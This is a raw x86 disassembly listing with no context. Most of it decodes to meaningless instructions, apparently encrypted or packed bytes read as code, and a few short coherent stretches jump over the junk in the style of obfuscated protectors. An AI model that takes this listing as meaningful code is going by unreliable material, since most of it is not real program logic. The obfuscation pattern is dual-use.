  404a1c:	push   ss
  404a1d:	into   
  404a1e:	add    BYTE PTR [esi-0x7f],ch
  404a21:	outs   dx,BYTE PTR ds:[esi]
  404a22:	or     eax,0x2c42350
  404a27:	sub    BYTE PTR [eax],cl
  404a29:	in     al,dx
  404a2a:	pop    ds
  404a2b:	and    BYTE PTR [edi],bl
  404a2d:	mov    dh,BYTE PTR [ecx-0x1bf7abc]
  404a33:	(bad)  
  404a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a35:	pop    ebp
  404a36:	add    dl,BYTE PTR [edi]
  404a38:	repnz mul DWORD PTR [eax+0x747ef695]
  404a3f:	cmp    cl,bl
  404a41:	mov    al,ds:0x9e2be18c
  404a46:	pop    eax
  404a47:	mov    ebx,DWORD PTR [ecx+0x22de6bc3]
  404a4d:	call   0x5d04:0x7a2c0310
  404a54:	daa    
  404a55:	cs pop ss
  404a57:	imul   eax,DWORD PTR [esi],0xffffffec
  404a5a:	in     al,0xd2
  404a5c:	fmul   QWORD PTR [edi+0x7c]
  404a5f:	xchg   ebx,eax
  404a60:	pop    es
  404a61:	outs   dx,BYTE PTR ds:[esi]
  404a62:	push   eax
  404a63:	jp     0x404a44
  404a65:	or     DWORD PTR [ebp+0x7],edi
  404a68:	mov    eax,ds:0xdbdf5b72
  404a6d:	nop
  404a6e:	sub    edi,DWORD PTR [eax+esi*2+0x16]
  404a72:	loopne 0x404a2e
  404a74:	xchg   esi,eax
  404a75:	xor    al,0x3f
  404a77:	clc    
  404a78:	jl     0x4049fc
  404a7a:	push   esi
  404a7b:	xor    dl,ch
  404a7d:	(bad)  
  404a7e:	cmp    eax,0x8c035c5c
  404a83:	jle    0x404a08
  404a85:	int    0xae
  404a87:	mov    cl,0x9c
  404a89:	jnp    0x404a57
  404a8b:	cli    
  404a8c:	shl    DWORD PTR [ebp+0x5f4ddc09],0xe5
  404a93:	dec    edx
  404a94:	outs   dx,BYTE PTR ds:[esi]
  404a95:	loop   0x404a2b
  404a97:	cmp    cl,BYTE PTR [eax-0x6a]
  404a9a:	fcomi  st,st(1)
  404a9c:	rcr    BYTE PTR [ebx-0x6a],cl
  404a9f:	jg     0x404aab
  404aa1:	sub    al,0xf1
  404aa3:	dec    ebx
  404aa4:	pop    edi
  404aa5:	pop    edi
  404aa6:	and    al,0xc4
  404aa8:	fild   WORD PTR [ebx]
  404aaa:	pusha  
  404aab:	inc    ebx
  404aac:	pop    ebx
  404aad:	xor    eax,0x47876b2f
  404ab2:	in     al,0x39
  404ab4:	push   0x76437d9c
  404ab9:	jbe    0x404a50
  404abb:	inc    eax
  404abc:	adc    dl,dl
  404abe:	ret    
  404abf:	outs   dx,DWORD PTR ds:[esi]
  404ac0:	retf   
  404ac1:	dec    edx
  404ac2:	test   DWORD PTR [edx+0x5f],ecx
  404ac5:	ja     0x404b2d
  404ac7:	fstp   st(0)
  404ac9:	mov    DWORD PTR [eax-0x15],0x68b18c7f
  404ad0:	loopne 0x404af2
  404ad2:	pop    ss
  404ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad4:	xchg   esp,eax
  404ad5:	sbb    BYTE PTR [ecx-0x78],0x73
  404ad9:	(bad)  
  404ada:	arpl   WORD PTR [eax],si
  404adc:	and    ebx,DWORD PTR [edx]
  404ade:	js     0x404b01
  404ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae1:	and    bl,dh
  404ae3:	push   es
  404ae4:	mov    esp,0x66c363ec
  404ae9:	int    0x67
  404aeb:	xchg   edi,eax
  404aec:	lock into 
  404aee:	cwde   
  404aef:	retf   0x3895
  404af2:	loop   0x404b21
  404af4:	ds xchg dl,bh
  404af7:	ins    BYTE PTR es:[edi],dx
  404af8:	test   ebp,edx
  404afa:	ins    BYTE PTR es:[edi],dx
  404afb:	enter  0x9a78,0x9a
  404aff:	les    ebx,FWORD PTR [esi]
  404b01:	call   0x8ada824
  404b06:	(bad)  
  404b08:	hlt    
  404b09:	mov    eax,edi
  404b0b:	fs inc edx
  404b0d:	fisubr WORD PTR [edi+0x221ee2f8]
  404b13:	gs iret 
  404b15:	mov    ds:0xbe940b23,eax
  404b1a:	dec    eax
  404b1b:	xchg   ecx,ecx
  404b1d:	xor    ah,BYTE PTR [ebp-0xa2340fe]
  404b23:	jecxz  0x404b07
  404b25:	cmp    DWORD PTR [ebx],edx
  404b27:	ret    
  404b28:	push   esi
  404b29:	or     eax,ebx
  404b2b:	test   DWORD PTR [esi],edx
  404b2d:	push   esp
  404b2e:	mov    ecx,0xb18bdc63
  404b34:	call   0x6e0d:0x7ccb8a18
  404b3b:	inc    ecx
  404b3c:	push   esp
  404b3d:	xchg   bh,dh
  404b3f:	repz mov ds:0x4963e255,eax
  404b45:	sub    DWORD PTR [ecx+0x39e1ef82],esp
  404b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b4c:	cmp    ch,BYTE PTR [edi+0x3b]
  404b4f:	rcl    BYTE PTR [eax+eiz*1-0xb],cl
  404b53:	gs dec edx
  404b55:	mov    bl,0x23
  404b57:	or     BYTE PTR [ebp+0x5c],0x38
  404b5b:	jb     0x404b54
  404b5d:	pop    esi
  404b5e:	lods   al,BYTE PTR ds:[esi]
  404b5f:	cmp    al,0x9a
  404b61:	push   0x3b7cb7a1
  404b66:	jmp    0xa268:0x1ed30afb
  404b6d:	adc    al,BYTE PTR [edi-0x751b8275]
  404b73:	xchg   esp,eax
  404b74:	cmp    bl,BYTE PTR [ebp-0x77ffcd8e]
  404b7a:	push   ebp
  404b7b:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  404b81:	hlt    
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	stc    
  404b99:	inc    ebp
  404b9a:	mov    WORD PTR [ebp+0x2e],gs
  404b9d:	cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404c1c
  404ba5:	mov    ecx,0x39fb9e5c
  404baa:	(bad)  
  404bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bac:	outs   dx,BYTE PTR ds:[esi]
  404bad:	int    0x93
  404baf:	fist   DWORD PTR [esi]
  404bb1:	jmp    0x42e1f80e
  404bb6:	bswap  ebp
  404bb8:	es dec esp
  404bba:	out    0x35,al
  404bbc:	stc    
  404bbd:	adc    ch,cl
  404bbf:	push   ebx
  404bc0:	stos   BYTE PTR es:[edi],al
  404bc1:	adc    ebp,esi
  404bc3:	cmp    BYTE PTR [ecx],al
  404bc5:	test   al,dh
  404bc7:	push   0xfb05640e
  404bcc:	sbb    ebx,DWORD PTR [edx]
  404bce:	cmp    BYTE PTR [edx+0x5c8d26a1],0x42
  404bd5:	mul    BYTE PTR [eax]
  404bd7:	ret    
  404bd8:	imul   BYTE PTR [esi]
  404bda:	xor    BYTE PTR [ebx+edi*8],0xc7
  404bde:	mov    esi,DWORD PTR [esi]
  404be0:	leave  
  404be1:	or     al,0x24
  404be3:	adc    BYTE PTR [ecx+eax*4+0x241ebb99],ch
  404bea:	lahf   
  404beb:	lahf   
  404bec:	sar    ch,cl
  404bee:	mov    al,ds:0x585fa69d
  404bf3:	add    edi,0xd3d301ed
  404bf9:	xchg   DWORD PTR [edx],ebp
  404bfb:	call   0xbd68:0xe99df2ec
  404c02:	rcl    DWORD PTR ds:0xec16d0e7,0x49
  404c09:	sub    DWORD PTR [eax-0x43],edi
  404c0c:	popa   
  404c0d:	out    dx,al
  404c0e:	sbb    DWORD PTR [edi-0x7f],ebp
  404c11:	cli    
  404c12:	(bad)
  404c15:	lea    ecx,cs:[edi-0x55d3196e]
  404c1c:	out    dx,al
  404c1d:	imul   edx,DWORD PTR [edi+0x17],0xaafafff9
  404c24:	jmp    0x576dc82e
  404c29:	(bad)  
  404c2a:	stc    
  404c2b:	fld    DWORD PTR [esi+0x1b78398c]
  404c31:	add    BYTE PTR [eax-0x6137f1d7],dh
  404c37:	adc    eax,0xd8fb77bf
  404c3c:	sbb    eax,0x93fc0ac7
  404c41:	mov    BYTE PTR [ebx+0x75a8d715],ah
  404c47:	push   0x5a
  404c49:	xor    eax,0x34f42197
  404c4e:	mov    ds:0xa46d394c,al
  404c53:	retf   
  404c54:	and    BYTE PTR [ebx-0x7e2b88a4],ah
  404c5a:	push   eax
  404c5b:	(bad)  
  404c5c:	xchg   ecx,eax
  404c5d:	fs in  al,dx
  404c5f:	or     bl,dh
  404c61:	cwde   
  404c62:	(bad)  
  404c63:	in     al,dx
  404c64:	and    DWORD PTR [esp+ebx*8],0x62eb8c7b
  404c6b:	pop    edi
  404c6c:	lahf   
  404c6d:	lods   eax,DWORD PTR ds:[si]
  404c6f:	mov    dh,0x62
  404c71:	jecxz  0x404c18
  404c73:	retf   0x24b4
  404c76:	jp     0x404c8b
  404c78:	inc    ebx
  404c79:	std    
  404c7a:	jmp    0xd1224abb
  404c7f:	xchg   DWORD PTR [eax],ecx
  404c81:	lods   al,BYTE PTR ds:[esi]
  404c82:	int    0x6b
  404c84:	div    dh
  404c86:	mov    WORD PTR [esi],ss
  404c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c89:	and    BYTE PTR [edx+ebx*2+0x2d4fdc08],ah
  404c90:	and    eax,0xe7f4b131
  404c95:	and    BYTE PTR [edx-0x653dee5c],bl
  404c9b:	out    0x3,eax
  404c9d:	sbb    eax,0xfa641dd6
  404ca2:	or     eax,0xb0b7ca16
  404ca7:	adc    eax,0xde0eda4e
  404cac:	loopne 0x404cd1
  404cae:	repnz outs dx,BYTE PTR ds:[esi]
  404cb0:	fld    DWORD PTR [eax+eiz*2+0x542d7b9c]
  404cb7:	imul   esp,DWORD PTR [ecx],0x29
  404cba:	and    dl,0x59
  404cbd:	repz fldcw WORD PTR [edi-0xd]
  404cc1:	sbb    al,0x3c
  404cc3:	out    0x4d,eax
  404cc5:	dec    ecx
  404cc6:	mov    DWORD PTR [edi+0x7cae332e],esi
  404ccc:	and    eax,0x757b9b18
  404cd1:	imul   ecx,edi,0x11
  404cd4:	into   
  404cd5:	outs   dx,BYTE PTR ds:[esi]
  404cd6:	in     al,0xe2
  404cd8:	inc    esp
  404cd9:	idiv   BYTE PTR [eax]
  404cdb:	rep ins DWORD PTR es:[di],dx
  404cde:	sub    BYTE PTR [eax],0x59
  404ce1:	fbstp  TBYTE PTR [eax+0x64]
  404ce4:	pop    ebp
  404ce5:	mov    ds:0xe4bc12f4,eax
  404cea:	jo     0x404c7d
  404cec:	cmc    
  404ced:	(bad)  
  404cee:	jle    0x404d10
  404cf0:	mov    edi,DWORD PTR [edx-0x1]
  404cf3:	push   edi
  404cf4:	sub    BYTE PTR [edx],0x3e
  404cf7:	mov    dl,0x13
  404cf9:	bound  ebp,QWORD PTR [ebp*1+0x4b6b11af]
  404d00:	cwde   
  404d01:	cmp    BYTE PTR [ebx+0x255b9a9e],cl
  404d07:	xchg   ecx,eax
  404d08:	jle    0x404d55
  404d0a:	and    esi,DWORD PTR [ebp+0xb498625]
  404d10:	dec    esi
  404d11:	and    BYTE PTR [ebx+0x1],cl
  404d14:	ins    BYTE PTR es:[edi],dx
  404d15:	sti    
  404d16:	test   BYTE PTR [edx],dl
  404d18:	in     al,0x4c
  404d1a:	or     dl,dl
  404d1c:	out    0x99,al
  404d1e:	mov    cs,WORD PTR [ecx+0x32b66d53]
  404d24:	mov    ecx,0x9c47f39a
  404d29:	xchg   esp,eax
  404d2a:	and    ch,0x9a
  404d2d:	lea    eax,[esi-0x32]
  404d30:	push   es
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [ebx-0x68],dl
  404d94:	adc    BYTE PTR ds:0x7e7e2fbb,0x8b
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404da8
  404d9f:	dec    ecx
  404da0:	dec    edx
  404da1:	adc    DWORD PTR [esp+ebp*8-0x7c5a800f],ebx
  404da8:	pop    es
  404da9:	aam    0x7c
  404dab:	and    al,0x66
  404dad:	and    eax,0x9fbbb78d
  404db2:	or     eax,0xf7933c3c
  404db7:	sub    al,BYTE PTR [ebx]
  404db9:	push   ebp
  404dba:	test   al,0x41
  404dbc:	je     0x404d59
  404dbe:	imul   edi,DWORD PTR [eax],0x3e7f5889
  404dc4:	mov    ah,0x2c
  404dc6:	lahf   
  404dc7:	test   DWORD PTR [edx],ebp
  404dc9:	daa    
  404dca:	stos   BYTE PTR es:[edi],al
  404dcb:	and    al,BYTE PTR [ebp+0x419a9e2a]
  404dd1:	sub    al,0x94
  404dd3:	(bad)  
  404dd4:	pop    ss
  404dd5:	fs das 
  404dd7:	arpl   WORD PTR ds:0xf01af640,di
  404ddd:	or     eax,0x6ae7adb9
  404de2:	inc    edx
  404de3:	mov    edx,0xdb7a3b66
  404de8:	jbe    0x404e45
  404dea:	inc    ecx
  404deb:	jne    0x404d71
  404ded:	xchg   ebp,eax
  404dee:	fisub  WORD PTR [ebp-0x6d3e0e62]
  404df4:	pop    esi
  404df5:	mov    ch,dh
  404df7:	mov    bl,0x1e
  404df9:	ins    DWORD PTR es:[edi],dx
  404dfa:	rol    DWORD PTR [ebx+ecx*2-0x6f],0xae
  404dff:	pop    eax
  404e00:	retf   
  404e01:	fcom   DWORD PTR [eax+0x12b06e27]
  404e07:	mov    al,0x82
  404e09:	mov    bh,0x11
  404e0b:	out    0xfc,al
  404e0d:	xchg   ebp,eax
  404e0e:	aam    0x7f
  404e10:	sbb    BYTE PTR [ecx+0x78ecfa57],0x2e
  404e17:	retf   0xa0b8
  404e1a:	dec    ebx
  404e1b:	(bad)  
  404e1d:	dec    edi
  404e1e:	shl    BYTE PTR [ebx],1
  404e20:	inc    esp
  404e21:	and    DWORD PTR [ebx+0x5833a2e6],edx
  404e27:	sahf   
  404e28:	mul    BYTE PTR [ebx+ebp*4-0x43]
  404e2c:	xor    edi,ebx
  404e2e:	rol    BYTE PTR [ecx-0x2d],cl
  404e31:	arpl   WORD PTR [edi+0x40],sp
  404e34:	lahf   
  404e35:	dec    eax
  404e36:	into   
  404e37:	cmp    al,0x2f
  404e39:	jnp    0x404e7a
  404e3b:	jl     0x404e1d
  404e3d:	mov    ah,0x79
  404e3f:	sbb    eax,0x9d87a915
  404e44:	jne    0x404e0b
  404e46:	scas   al,BYTE PTR es:[edi]
  404e47:	xchg   ebp,eax
  404e48:	push   esi
  404e49:	fsubr  QWORD PTR [eax+0x54cb074a]
  404e4f:	pop    ds
  404e50:	pop    es
  404e51:	(bad)  
  404e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e53:	ins    BYTE PTR es:[edi],dx
  404e54:	cmp    DWORD PTR [edx],0xffffffab
  404e57:	cmp    BYTE PTR [esi+0x1a819725],0xe0
  404e5e:	fild   DWORD PTR [edi+eiz*1-0x52a6fce5]
  404e65:	popf   
  404e66:	mov    dh,0x4a
  404e68:	xchg   BYTE PTR [esi],ah
  404e6a:	add    edx,DWORD PTR [ecx-0x64]
  404e6d:	jno    0x404eba
  404e6f:	xchg   esp,eax
  404e70:	push   edx
  404e71:	jo     0x404e45
  404e73:	or     esi,DWORD PTR [esi-0x79475b43]
  404e79:	push   edx
  404e7a:	ins    BYTE PTR es:[edi],dx
  404e7b:	into   
  404e7c:	cld    
  404e7d:	rcr    DWORD PTR [ecx+esi*1-0x40b69e2e],0xf9
  404e85:	repnz in eax,0xe0
  404e88:	loopne 0x404e63
  404e8a:	mov    ah,0xbb
  404e8c:	paddd  mm7,QWORD PTR [eax+ebp*4-0x31ccf1cd]
  404e94:	ret    0xb1ba
  404e97:	pop    edx
  404e98:	clc    
  404e99:	xchg   ebp,eax
  404e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9b:	mov    dl,0xa
  404e9d:	aas    
  404e9e:	jmp    0x5fd50053
  404ea3:	push   edi
  404ea4:	shl    BYTE PTR ds:0xb4214fdd,cl
  404eaa:	mov    bl,0x8a
  404eac:	popf   
  404ead:	push   edi
  404eae:	lods   eax,DWORD PTR ds:[esi]
  404eaf:	pop    edi
  404eb0:	imul   ebx,DWORD PTR ds:0xb6f82cf5,0xfffffff7
  404eb7:	scas   al,BYTE PTR es:[edi]
  404eb8:	cdq    
  404eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eba:	test   al,0x82
  404ebc:	push   ebp
  404ebd:	fld    DWORD PTR [ebx-0x45]
  404ec0:	adc    edi,DWORD PTR [ebx-0x66]
  404ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ec4:	fwait
  404ec5:	and    eax,0x12ebc1a0
  404eca:	jg     0x404f14
  404ecc:	rol    cl,0x2e
  404ecf:	jnp    0x404e5c
  404ed1:	inc    edx
  404ed2:	sbb    esp,DWORD PTR [ebp+0x56606a57]
  404ed8:	add    ch,bl
  404eda:	or     al,0xe
  404edc:	inc    ebp
  404edd:	pop    esp
  404ede:	xchg   DWORD PTR [ebp+eax*8+0x5b9eb26d],esp
  404ee5:	mov    esp,0x6c0866d0
  404eea:	(bad)  
  404eeb:	icebp  
  404eec:	loope  0x404f57
  404eee:	ret    0x9de2
  404ef1:	pop    ecx
  404ef2:	xor    al,0xae
  404ef4:	aas    
  404ef5:	adc    al,0x12
  404ef7:	cwde   
  404ef8:	and    BYTE PTR [esi+eiz*2+0x16],cl
  404efc:	or     esi,DWORD PTR [eax-0x16]
  404eff:	jecxz  0x404ec7
  404f01:	test   eax,0x993c1f9a
  404f06:	dec    edi
  404f07:	retf   
  404f08:	inc    esi
  404f09:	fcomp  QWORD PTR [ecx+ebp*1]
  404f0c:	jno    0x404eb3
  404f0e:	js     0x404f1c
  404f10:	mov    esi,0x98205f2c
  404f15:	cmp    BYTE PTR [ebx+0x77482ef7],dl
  404f1b:	push   ecx
  404f1c:	and    DWORD PTR [edx-0x28095a47],ebp
  404f22:	(bad)  
  404f23:	adc    bl,cl
  404f25:	xor    eax,0x69b71df3
  404f2a:	cmp    al,0x33
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0xc3d15a29
  404f44:	jl     0x404f2f
  404f46:	sbb    al,0xc8
  404f48:	and    DWORD PTR [esi+0x7e],edi
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404ee8
  404f50:	and    ah,BYTE PTR [ebp+0x4480cfcf]
  404f56:	xor    BYTE PTR [edx-0x1be6f888],0xe1
  404f5d:	stos   DWORD PTR es:[edi],eax
  404f5e:	pushf  
  404f5f:	sub    al,0x53
  404f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f62:	enter  0xd985,0xd8
  404f66:	data16 sbb al,0xdb
  404f69:	imul   esp,esi,0x492731f9
  404f6f:	add    bh,BYTE PTR [ebx+0x667ff3a8]
  404f75:	outs   dx,DWORD PTR ds:[esi]
  404f76:	pop    ss
  404f77:	(bad)  
  404f78:	loop   0x404fcc
  404f7a:	jl     0x404f11
  404f7c:	jmp    0x8dbc:0x3f0c6ad
  404f83:	sub    cl,BYTE PTR [edx]
  404f85:	mov    al,0xdc
  404f87:	add    cl,ah
  404f89:	jecxz  0x404f5a
  404f8b:	ffreep st(6)
  404f8d:	stos   DWORD PTR es:[edi],eax
  404f8e:	mov    edx,ebp
  404f90:	addr16 fs ss retf 0x168b
  404f96:	(bad)  
  404f97:	sbb    BYTE PTR [ecx],ah
  404f99:	fstp   DWORD PTR [ebx]
  404f9b:	sbb    cl,dh
  404f9d:	sbb    edx,DWORD PTR ds:0x3ca94331
  404fa3:	or     edi,DWORD PTR ds:[ecx]
  404fa6:	ret    
  404fa7:	ss push ds
  404fa9:	and    eax,0xc4002615
  404fae:	adc    al,BYTE PTR [ecx+ebx*1]
  404fb1:	aad    0xf3
  404fb3:	stos   DWORD PTR es:[edi],eax
  404fb4:	lock sub eax,0x126c02d8
  404fba:	add    bl,ch
  404fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fbd:	push   ds
  404fbe:	or     DWORD PTR [edi-0x73],0xae6dd9a3
  404fc5:	mov    edx,0xffdfb770
  404fca:	adc    dl,BYTE PTR [edi]
  404fcc:	loop   0x404f6f
  404fce:	fs mov dh,0x33
  404fd1:	in     eax,dx
  404fd2:	xlat   BYTE PTR ds:[ebx]
  404fd3:	rcr    DWORD PTR es:[ecx+0x36be9462],cl
  404fda:	xchg   edi,eax
  404fdb:	pusha  
  404fdc:	aad    0x46
  404fde:	retf   
  404fdf:	inc    esi
  404fe0:	call   0xca82:0x2ee7669c
  404fe7:	add    bh,bl
  404fe9:	repz dec ecx
  404feb:	pop    es
  404fec:	inc    eax
  404fed:	xchg   edx,eax
  404fee:	add    esi,DWORD PTR [eax+0x7e3693c4]
  404ff4:	sbb    eax,0x6ec19ff3
  404ff9:	mov    ch,0x9d
  404ffb:	mov    ebx,0x96bf5680
  405000:	fst    DWORD PTR [eax*8-0x436bba26]
  405007:	push   eax
  405008:	pop    ss
  405009:	imul   edx,DWORD PTR [ebx+ebx*1+0x22],0xaebe3253
  405011:	push   cs
  405012:	or     cl,BYTE PTR [ecx+ebx*4+0x36294914]
  405019:	data16 add BYTE PTR [eax+0x43],cl
  40501d:	dec    ebp
  40501e:	adc    eax,0x5582b015
  405023:	xchg   edx,eax
  405024:	or     edx,DWORD PTR [esi]
  405026:	cs int 0x19
  405029:	int3   
  40502a:	fwait
  40502b:	adc    BYTE PTR [edx+0x737ce9c1],al
  405031:	push   edi
  405032:	dec    ebx
  405033:	push   ebp
  405034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405035:	xchg   BYTE PTR [ebx+0x6c],al
  405038:	je     0x4050af
  40503a:	rol    ah,0x27
  40503d:	loopne 0x404fe5
  40503f:	bound  edi,QWORD PTR [ecx+0x1d]
  405042:	cwde   
  405043:	cmp    BYTE PTR [esi+edx*2-0x2499607a],cl
  40504a:	popf   
  40504b:	cs scas al,BYTE PTR es:[edi]
  40504d:	xor    al,0x28
  40504f:	add    esi,DWORD PTR ds:[eax-0x4eed2790]
  405056:	aad    0x91
  405058:	sub    dh,BYTE PTR ds:0x7d992d8a
  40505e:	pushf  
  40505f:	js     0x404fe2
  405061:	push   esp
  405062:	and    bh,BYTE PTR [ecx+0x5fa38652]
  405068:	dec    ebx
  405069:	ja     0x405040
  40506b:	das    
  40506c:	cdq    
  40506d:	stos   DWORD PTR es:[edi],eax
  40506e:	in     al,0x72
  405070:	addr16 hlt 
  405072:	xor    ch,BYTE PTR [ecx-0x4a]
  405075:	xchg   ebx,eax
  405076:	pop    es
  405077:	sbb    eax,0x1fc19ef8
  40507c:	add    DWORD PTR [esi],0x63
  40507f:	fistp  WORD PTR [edx-0x2e]
  405082:	hlt    
  405083:	xor    esi,DWORD PTR [ebx+0x2299ad46]
  405089:	bound  ebp,QWORD PTR [ecx-0x6b5ac544]
  40508f:	sub    edi,ebp
  405091:	clc    
  405092:	into   
  405093:	xlat   BYTE PTR ds:[ebx]
  405094:	dec    WORD PTR [eax]
  405097:	(bad)  
  405099:	push   ebp
  40509a:	adc    ebp,DWORD PTR [ecx+0x56fb6bc1]
  4050a0:	addr16 inc ecx
  4050a2:	push   ecx
  4050a3:	push   cs
  4050a4:	jecxz  0x405103
  4050a6:	cmp    eax,0x23458bdc
  4050ab:	aam    0xc7
  4050ad:	xor    esi,DWORD PTR [esi+0x62]
  4050b0:	ficom  WORD PTR [ebx]
  4050b2:	add    cl,dl
  4050b4:	out    dx,eax
  4050b5:	in     eax,0x56
  4050b7:	inc    ebp
  4050b8:	sub    ch,BYTE PTR ds:0xc539afce
  4050be:	push   esi
  4050bf:	inc    esp
  4050c0:	leave  
  4050c1:	xchg   edi,eax
  4050c2:	adc    al,0xfa
  4050c4:	inc    eax
  4050c5:	jl     0x405090
  4050c7:	mov    bh,0x87
  4050c9:	test   BYTE PTR [edi],ah
  4050cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050cc:	es loopne 0x40509b
  4050cf:	mov    al,ds:0x9573676
  4050d4:	inc    esp
  4050d5:	rol    DWORD PTR [ebx-0x10],1
  4050d8:	loop   0x4050c0
  4050da:	push   esi
  4050db:	pop    ss
  4050dc:	mov    ebx,DWORD PTR [ebp-0x18]
  4050df:	xor    ebx,eax
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	pop    edx
  40510e:	dec    edx
  40510f:	retf   
  405110:	push   esp
  405111:	inc    ebp
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405145
  40511a:	mov    eax,0x60f7ee50
  40511f:	sbb    ebx,DWORD PTR [edi-0x39]
  405122:	dec    ecx
  405123:	dec    ecx
  405124:	dec    edx
  405125:	push   edi
  405126:	jge    0x4050f4
  405128:	dec    ecx
  405129:	and    DWORD PTR [edi],edx
  40512b:	xor    eax,0xad7c66a4
  405130:	es dec esp
  405132:	adc    ah,BYTE PTR [edx-0x1ad221f6]
  405138:	xchg   edx,eax
  405139:	ins    BYTE PTR es:[edi],dx
  40513a:	add    ebx,0x3d
  40513d:	outs   dx,BYTE PTR ds:[esi]
  40513e:	xchg   edx,eax
  40513f:	jmp    0x4051a2
  405141:	imul   ebx,DWORD PTR [ecx-0x1d],0xffffffb7
  405145:	scas   eax,DWORD PTR es:[edi]
  405146:	mov    BYTE PTR [eax-0x15],ch
  405149:	sti    
  40514a:	sahf   
  40514b:	mov    dl,0x61
  40514d:	sti    
  40514e:	shl    ebx,cl
  405150:	xor    al,0xf3
  405152:	jl     0x405130
  405154:	popf   
  405155:	pcmpgtb mm1,QWORD PTR [edi+0x17]
  405159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40515a:	jnp    0x4051a0
  40515c:	cmc    
  40515d:	mov    al,0x9
  40515f:	mov    dl,0x70
  405161:	add    esi,ecx
  405163:	mov    esi,esi
  405165:	pop    eax
  405166:	adc    BYTE PTR [edx+ebp*2+0x23a82186],ah
  40516d:	inc    esi
  40516e:	jbe    0x40515b
  405170:	xchg   ebx,eax
  405171:	pop    ds
  405172:	jg     0x405144
  405174:	jnp    0x4051bf
  405176:	fwait
  405177:	dec    eax
  405178:	mov    ah,0xfc
  40517a:	mov    BYTE PTR [ecx-0x2f157c66],bh
  405180:	in     al,0x9a
  405182:	ret    
  405183:	fdivr  QWORD PTR [esi+0x7]
  405186:	xor    eax,eax
  405188:	mov    dl,0x22
  40518a:	ss jle 0x4051fd
  40518d:	add    eax,0x4342a2d2
  405192:	outs   dx,BYTE PTR ds:[esi]
  405193:	mov    ecx,0x229db284
  405198:	dec    ebx
  405199:	add    DWORD PTR [edi-0x667e638],esp
  40519f:	mov    al,ds:0x43e22b1e
  4051a4:	stos   BYTE PTR es:[edi],al
  4051a5:	hlt    
  4051a6:	sbb    al,0x78
  4051a8:	nop
  4051a9:	arpl   WORD PTR [ecx+0x3d9e534c],bx
  4051af:	sbb    BYTE PTR [eax-0x90e9d15],ch
  4051b5:	or     DWORD PTR [ecx],ebp
  4051b7:	push   ds
  4051b8:	push   es
  4051b9:	icebp  
  4051ba:	push   edx
  4051bb:	cmp    bh,BYTE PTR [ecx-0x1d]
  4051be:	dec    ecx
  4051bf:	test   DWORD PTR [esi-0x381aa7df],0x26647df9
  4051c9:	xor    DWORD PTR [edx],ebx
  4051cb:	stc    
